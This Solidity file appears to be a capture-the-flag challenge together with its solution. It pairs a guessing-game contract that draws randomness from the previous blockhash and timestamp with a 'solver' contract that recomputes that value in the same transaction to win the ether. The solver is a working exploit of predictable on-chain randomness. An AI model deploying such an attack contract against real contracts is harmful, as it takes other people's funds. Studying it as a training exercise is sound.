pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }


    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1),  now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

interface IGuessTheNewNumberChallenge {
    function isComplete() public view returns (bool);
    function guess(uint8 n) public payable;
}

contract solver {
    address owner;
    IGuessTheNewNumberChallenge public challengeContract;

    function solver(address _challengeAddress)  public payable {
        challengeContract = IGuessTheNewNumberChallenge(_challengeAddress);
        owner = msg.sender;
    }

    function solve() public payable {
        require(msg.sender == owner);
        require(msg.value == 1 ether);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challengeContract.guess.value(1 ether)(answer);
        owner.transfer(address(this).balance);
    }

    function() public payable {}
}